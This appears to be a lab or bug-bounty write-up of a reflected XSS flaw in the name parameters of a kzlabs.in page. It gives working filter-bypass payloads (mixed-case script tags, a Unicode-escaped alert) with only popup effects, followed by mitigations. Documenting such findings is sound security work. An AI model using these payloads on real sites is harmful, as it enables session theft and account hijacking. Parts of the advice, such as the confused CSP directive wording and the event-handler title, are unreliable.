# Reflected Cross-Site Scripting (XSS) - Event Handler Filter Evasion

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application attempts to filter or sanitize user input using blacklists for common JavaScript functions like `alert`, `confirm`, and `prompt`. However, this protection can be bypassed using Unicode escape sequences (`\u0074`) to obfuscate function names. By injecting `<ScRiPt>` tags with mixed-case formatting and using Unicode escape sequences, arbitrary code execution is achieved despite function name filtering mechanisms.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering `confirm(1)` and `alert(1)` popups.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/10.php?fname='>anil<ScRiPt>confirm(1)</ScRiPt>&lname='>anil<ScRiPt>aler\u0074(1)</ScRiPt>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname='>anil<ScRiPt>confirm(1)</ScRiPt>
   lname='>anil<ScRiPt>aler\u0074(1)</ScRiPt>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/10.php?fname=%27%3Eanil%3CScRiPt%3Econfirm%281%29%3C%2FScRiPt%3E&lname=%27%3Eanil%3CScRiPt%3Ealer%5Cu0074%281%29%3C%2FScRiPt%3E
   ```

4. Observe that the browser executes the injected payload and displays `confirm(1)` and `alert(1)` popups.

## Payloads Used

```text
fname: '>anil<ScRiPt>confirm(1)</ScRiPt>
lname: '>anil<ScRiPt>aler\u0074(1)</ScRiPt>
```

URL-encoded versions:
```text
fname: %27%3Eanil%3CScRiPt%3Econfirm%281%29%3C%2FScRiPt%3E
lname: %27%3Eanil%3CScRiPt%3Ealer%5Cu0074%281%29%3C%2FScRiPt%3E
```

## Proof of Concept

The application attempts to filter common JavaScript function names like `alert`, `confirm`, and `prompt`. However, the payload uses Unicode escape sequences to bypass this filtering.

The payload works by:
1. Breaking out of the existing HTML context using `'>`
2. Injecting `<ScRiPt>` tags with mixed-case formatting to evade case-sensitive filters
3. Using the Unicode escape sequence `\u0074` which represents the letter 't'
4. When the browser decodes the string, `aler\u0074` becomes `alert`
5. The `confirm(1)` and `alert(1)` functions execute, displaying popups

```html
<!-- Original payloads: -->
<script>confirm(1)</script>
<script>aler\u0074(1)</script>

<!-- After Unicode decoding: -->
<script>confirm(1)</script>
<script>alert(1)</script>
```

This technique effectively bypasses blacklist-based filtering that searches for exact function names like "alert" while allowing encoded representations.

<img width="1576" height="605" alt="Screenshot 2026-08-14 190430" src="https://github.com/user-attachments/assets/e7d9c5c9-596d-48eb-891d-5156677a4974" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass function name blacklist filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
  echo htmlspecialchars($_GET['lname'], ENT_QUOTES, 'UTF-8');
  ```

- **Comprehensive Filtering**: Instead of relying on blacklists, use a whitelist approach to allow only safe characters and patterns.

- **Normalize Input**: Before filtering, normalize Unicode escape sequences and other encoding variants.
  ```php
  $input = json_decode('"' . addslashes($_GET['lname']) . '"');
  ```

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes.

- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.

---
